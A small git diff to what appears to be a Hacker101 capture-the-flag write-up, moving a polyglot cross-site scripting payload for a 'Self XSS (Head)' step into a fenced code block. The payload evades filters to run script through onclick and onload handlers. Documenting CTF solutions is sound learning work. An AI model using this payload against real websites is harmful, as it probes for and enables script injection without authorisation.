@@ -47,6 +47,10 @@ Enter payload into body and POST
 ## Self XSS (Head)
 
 Enter payload into title:     
-`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`   
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
 
 ![Self XSS in Head](https://github.com/Isopach/Hacker101/blob/master/img/level3_self_xss_head.png)
